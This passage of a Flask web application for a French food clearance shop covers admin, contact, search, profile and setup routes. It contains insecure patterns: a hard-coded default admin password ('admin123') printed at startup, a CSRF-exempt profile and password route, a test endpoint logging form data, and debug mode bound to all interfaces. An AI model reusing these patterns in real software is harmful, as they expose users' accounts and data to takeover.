        lastmod.text = datetime.now().strftime('%Y-%m-%d')
        changefreq = ET.SubElement(url_elem, 'changefreq')
        changefreq.text = 'weekly'
        priority = ET.SubElement(url_elem, 'priority')
        priority.text = '0.9'
    
    xml_str = ET.tostring(root, encoding='utf-8')
    dom = minidom.parseString(xml_str)
    
    return dom.toprettyxml(indent='  '), 200, {'Content-Type': 'application/xml'}


@app.route('/robots.txt')
def robots_txt():
    """Fichier robots.txt"""
    return """User-agent: *
Allow: /

Sitemap: https://www.destockalimentaire.com/sitemap.xml
Sitemap: https://www.destockalimentaire.com/sitemap-produits.xml
""", 200, {'Content-Type': 'text/plain'}



@app.route('/admin/commandes')
@login_required
def admin_commandes():
    """Liste des commandes (admin)"""
    if current_user.role != 'admin':
        flash('Accès non autorisé', 'danger')
        return redirect(url_for('index'))
    
    commandes = Commande.query.order_by(Commande.date_creation.desc()).all()
    return render_template('admin/commandes.html', commandes=commandes)

@app.route('/admin/commandes/<int:commande_id>/statut', methods=['POST'])
@login_required
def admin_modifier_statut(commande_id):
    """Modifier le statut d'une commande (admin)"""
    if current_user.role != 'admin':
        return jsonify({'success': False, 'error': 'Non autorisé'}), 403
    
    commande = Commande.query.get_or_404(commande_id)
    data = request.get_json()
    nouveau_statut = data.get('statut')
    
    if nouveau_statut in ['en_attente', 'confirmee', 'expediee', 'livree', 'annulee']:
        commande.statut = nouveau_statut
        db.session.commit()
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Statut invalide'}), 400

# Route contact
@app.route('/contact', methods=['GET', 'POST'])
def contact():
    """Page de contact"""
    if request.method == 'POST':
        nom = request.form.get('nom')
        prenom = request.form.get('prenom')
        email = request.form.get('email')
        telephone = request.form.get('telephone')
        sujet = request.form.get('sujet')
        message = request.form.get('message')
        
        # Envoyer à Telegram
        try:
            telegram_message = f"""
📬 *NOUVEAU MESSAGE CONTACT*
┏━━━━━━━━━━━━━━━━━━━━━
┃ *Nom:* {prenom} {nom}
┃ *Email:* {email}
┃ *Téléphone:* {telephone or 'Non renseigné'}
┃ *Sujet:* {sujet}
┃ *Message:* 
┃ {message}
┃ *Date:* {datetime.now().strftime('%d/%m/%Y %H:%M')}
┗━━━━━━━━━━━━━━━━━━━━━
            """
            
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                json={
                    'chat_id': TELEGRAM_CHAT_ID,
                    'text': telegram_message,
                    'parse_mode': 'Markdown'
                },
                timeout=5
            )
            flash('Votre message a été envoyé avec succès !', 'success')
        except:
            flash('Erreur lors de l\'envoi du message', 'danger')
        
        return redirect(url_for('contact'))
    
    return render_template('contact.html')

# Route pour les recherches
@app.route('/recherche')
def recherche():
    """Page de recherche"""
    query = request.args.get('q', '')
    page = request.args.get('page', 1, type=int)
    
    if not query:
        return render_template('recherche.html', produits=None, query=query)
    
    produits = Produit.query.filter(
        Produit.nom.contains(query) | 
        Produit.description.contains(query)
    ).filter_by(actif=True).paginate(page=page, per_page=12, error_out=False)
    
    return render_template('recherche.html', produits=produits, query=query)

# Route pour les mentions légales
@app.route('/mentions-legales')
def mentions_legales():
    """Page des mentions légales"""
    return render_template('mentions_legales.html')

@app.route('/cgv')
def cgv():
    """Page des conditions générales de vente"""
    return render_template('cgv.html')

@app.route('/confidentialite')
def confidentialite():
    """Page de politique de confidentialité"""
    return render_template('confidentialite.html')

# Route pour le suivi de commande (invités)
@app.route('/suivi-commande')
def suivi_commande():
    """Page de suivi de commande pour les invités"""
    numero = request.args.get('numero')
    
    if numero:
        commande = Commande.query.filter_by(numero=numero).first()
        if commande:
            return render_template('suivi_commande.html', commande=commande)
        else:
            flash('Aucune commande trouvée avec ce numéro', 'warning')
    
    return render_template('suivi_commande_form.html')



@app.route('/offres-flash')
def offres_flash():
    """Page des offres flash"""
    produits = Produit.query.filter(
        Produit.prix_promo.isnot(None),
        Produit.actif == True
    ).order_by(Produit.date_ajout.desc()).limit(20).all()
    
    return render_template('offres_flash.html', produits=produits)

# Gestion des erreurs
@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html'), 500

# Initialisation de la base de données
@app.cli.command('init-db')
def init_db_command():
    """Initialiser la base de données"""
    with app.app_context():
        db.create_all()
        
        # Créer un admin par défaut si aucun n'existe
        if not Utilisateur.query.filter_by(role='admin').first():
            admin = Utilisateur(
                email='admin@destockpro.fr',
                password=generate_password_hash('admin123'),
                nom='Admin',
                prenom='Super',
                role='admin',
                actif=True
            )
            db.session.add(admin)
            
            # Créer des catégories par défaut
            categories = [
                Categorie(nom='Boissons', description='Eaux, jus, sodas', ordre=1),
                Categorie(nom='Vins, Champagnes et Spiritueux', description='Vins et champagnes', ordre=2),
                Categorie(nom='Produits frais', description='Fruits et légumes', ordre=3),
                Categorie(nom='Épicerie', description='Épicerie salée et sucrée', ordre=4),
                Categorie(nom='Surgelés', description='Produits surgelés', ordre=5),
                Categorie(nom='Produits laitiers', description='Lait, fromages', ordre=6),
                Categorie(nom='Viandes et poissons', description='Viandes premium', ordre=7),
                Categorie(nom='Promotions', description='Offres spéciales', ordre=8),
            ]
            
            for cat in categories:
                db.session.add(cat)
            
            db.session.commit()
            print("✅ Base de données initialisée avec admin et catégories par défaut")
# Redirection pour /admin vers le dashboard

@app.route('/compte/profil', methods=['GET', 'POST'])
@csrf.exempt 
@login_required
def compte_profil():
    """Page de modification du profil"""
    if request.method == 'POST':
        # Mettre à jour les informations
        current_user.prenom = request.form.get('prenom')
        current_user.nom = request.form.get('nom')
        current_user.email = request.form.get('email')
        current_user.telephone = request.form.get('telephone')
        current_user.adresse = request.form.get('adresse')
        current_user.code_postal = request.form.get('code_postal')
        current_user.ville = request.form.get('ville')
        current_user.pays = request.form.get('pays')
        
        # Changer le mot de passe si fourni
        new_password = request.form.get('new_password')
        if new_password:
            current_password = request.form.get('current_password')
            if current_password and check_password_hash(current_user.password, current_password):
                current_user.password = generate_password_hash(new_password)
                flash('Mot de passe modifié avec succès', 'success')
            else:
                flash('Mot de passe actuel incorrect', 'danger')
                return redirect(url_for('compte_profil'))
        
        db.session.commit()
        flash('Profil mis à jour avec succès', 'success')
        return redirect(url_for('compte_profil'))
    
    return render_template('compte/profil.html', utilisateur=current_user)

@app.route('/test-paiement', methods=['GET', 'POST'])
@csrf.exempt
def test_paiement():
    print("=" * 80)
    print("🚀 TEST PAIEMENT - APPELÉ")
    print(f"   Méthode: {request.method}")
    print(f"   Form data: {dict(request.form)}")
    
    if request.method == 'POST':
        return "Formulaire reçu ! Vérifiez les logs."
    
    return '''
    <form method="POST">
        <input type="text" name="nom" value="Test">
        <input type="email" name="email" value="test@test.com">
        <button type="submit">Envoyer</button>
    </form>
    '''

@app.route('/admin')
@login_required
def admin_redirect():
    """Rediriger /admin vers le dashboard admin"""
    if current_user.role != 'admin':
        flash('Accès non autorisé', 'danger')
        return redirect(url_for('index'))
    return redirect(url_for('admin_vue_globale'))

if __name__ == '__main__':
    with app.app_context():
        # Créer les tables
        db.create_all()
        print("✅ Base de données initialisée")
        
        # Synchroniser avec data.py (déjà dans le contexte)
        sync_with_data_file()
        
        # Créer un admin par défaut si nécessaire
        if not Utilisateur.query.filter_by(role='admin').first():
            admin = Utilisateur(
                email='admin@destockpro.fr',
                password=generate_password_hash('admin123'),
                nom='Admin',
                prenom='Super',
                role='admin',
                actif=True
            )
            db.session.add(admin)
            db.session.commit()
            print("✅ Admin par défaut créé: admin@destockpro.fr / admin123")
    
    # Lancer l'application
    app.run(debug=True, host='0.0.0.0', port=5001)
